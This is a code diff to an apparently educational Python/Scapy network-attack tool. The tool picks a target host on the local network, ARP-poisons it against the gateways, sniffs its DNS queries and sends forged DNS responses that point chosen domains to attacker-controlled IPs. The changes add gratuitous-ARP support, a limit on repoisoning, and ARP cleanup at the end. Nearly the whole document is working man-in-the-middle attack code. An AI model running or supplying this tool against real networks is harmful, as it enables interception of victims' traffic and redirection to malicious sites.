@@ -16,6 +16,7 @@ regex = re.compile(
         r'(?:/?|[/?]\S+)$', re.IGNORECASE)
 
 REPOISON_TIME = int(10)
+END_POISON = int(2)
 
 # dns_hosts = {
 #     b"belot.bg.": "10.0.2.6",
@@ -24,8 +25,9 @@ REPOISON_TIME = int(10)
 # target_ip = "10.0.2.4" M1
 # ip_to_spoof = "10.0.2.6" M2k
 
-def dns_spoofing():
-    conf.verb = 0 # make scapy verbose (no output)
+def dns_spoofing(gratuitious, verbose):
+    if verbose:     
+        conf.verb = 0 # make scapy verbose (no output)
 
     spoof.clear()
 
@@ -42,10 +44,10 @@ def dns_spoofing():
 
     active_hosts, previous_tuples = sh.search_hosts(iface, [])
 
-    previous_tuples.append([""])
-    previous_tuples.append(["Input the IP address of the target out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):", 1])
     spoof.printf("")
+    previous_tuples.append([""])
     spoof.printf("Input the IP address of the target out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):", 1)
+    previous_tuples.append(["Input the IP address of the target out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):", 1])
 
     target = fpc.validate_ip(active_hosts, "", previous_tuples)
 
@@ -72,7 +74,8 @@ def dns_spoofing():
         i+=1
 
     spoof.printf("")
-    spoof.printf("Starting poisoning...", 4)
+    spoof.printf("Starting poisoning... (Use Ctrl+Z to stop and kill the program)", 4)
+
     # Start ARP poisoning
     my_addresses = sh.get_my_details(iface)
     for gw_ip, gw_iface in gateways:
@@ -80,10 +83,15 @@ def dns_spoofing():
 
     spoof.printf("Poisoning initiated.", 4)
 
-    dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts)
+    dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts, gratuitious, END_POISON)
 
-    # TODO stop arp poisoning
-
+    # end poisoning
+    for gw_ip, gw_iface in gateways:
+        for host in active_hosts:
+            if host['ip'] == gw_ip:
+                arp.one_way_arp_end(target["mac"], target["ip"], host['mac'], host['ip'], my_addresses['mac'], my_addresses['ip'], iface)
+                break
+                
 
 def choose_websites(active_hosts, previous_tuples):
     
@@ -116,10 +124,9 @@ def choose_websites(active_hosts, previous_tuples):
 
             spoof.printf("")
             spoof.printf("Added tuple (" + url + ", " + ip + ")", 0)
-            time.sleep(1)
+            time.sleep(0.5)
 
     return dns_hosts
-
 
 def input_web(i, eend, _iter, isURL, active_hosts, previous_tuples):
     res = spoof.inputf(i, eend, previous_tuples)
@@ -154,7 +161,6 @@ def is_IP_valid(active_hosts, ip_address):
         return ip_address, True
     except:
         # check the ip using regular expressions
-
         match = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", ip_address)
         if bool(match) is False:
             return ip_address, False
@@ -165,24 +171,28 @@ def is_IP_valid(active_hosts, ip_address):
 
         return ip_address, True
 
-def dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts):
-    last_poison_time = time.time() - REPOISON_TIME
-    _filter = "udp"
+def dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts, gratuitious, end_poison):
+        last_poison_time = time.time() - REPOISON_TIME
+        _filter = "udp"
 
-    while True:
-        # sniff for 1 packet that adheres to the {_filter}
-        sniff(prn=process_udp_pkt(target, iface, dns_hosts), filter=_filter, store=0, count=1, timeout=REPOISON_TIME)   
+        while True:
+            # sniff for 1 packet that adheres to the {_filter}
+            sniff(prn=process_udp_pkt(target, iface, dns_hosts), filter=_filter, store=0, count=1, timeout=REPOISON_TIME)   
 
-        # {REPOISON_TIME} seconds have passed => should repoison
-        current_time = time.time()
-        if current_time - last_poison_time > REPOISON_TIME - 0.5:
-            repoison(my_addresses, gateways, target, iface)
-            last_poison_time = current_time
+            # {REPOISON_TIME} seconds have passed => should repoison
+            current_time = time.time()
+            if current_time - last_poison_time > REPOISON_TIME - 0.5:
+                repoison(my_addresses, gateways, target, iface, gratuitious)
+                last_poison_time = current_time
+                end_poison -= 1
 
-def repoison(my_addresses, gateways, target, iface):
+            if end_poison < 1:
+                break
+
+def repoison(my_addresses, gateways, target, iface, gratuitious):
     spoof.printf("Repoisoning", 4)
     for gw_ip, gw_iface in gateways:
-        arp.one_way_arp(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface, 2)
+        arp.one_way_arp(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface, 2, gratuitious)
 
 def process_udp_pkt(target, iface, dns_hosts):
     def process_udp_pkt_inside(pkt): 
@@ -190,9 +200,7 @@ def process_udp_pkt(target, iface, dns_hosts):
             spoof.printf("Found DNS query from " + pkt[IP].src + " for " + pkt[DNSQR].qname + " Spoofing response.", 5)
             resp_packet = build_dns_response_packet(pkt, dns_hosts[pkt[DNSQR].qname])
             sendp(resp_packet, iface=iface)
-        else: 
-            pass
-            #spoof.printf("Found another packet")
+
     return process_udp_pkt_inside
 
 def build_dns_response_packet(pkt, malicious_ip):
@@ -222,7 +230,3 @@ def build_dns_response_packet(pkt, malicious_ip):
 
         new_pkt = eth / ip / udp / dns
         return new_pkt
-
-# call main
-if __name__=="__main__":
-    dns_spoofing()
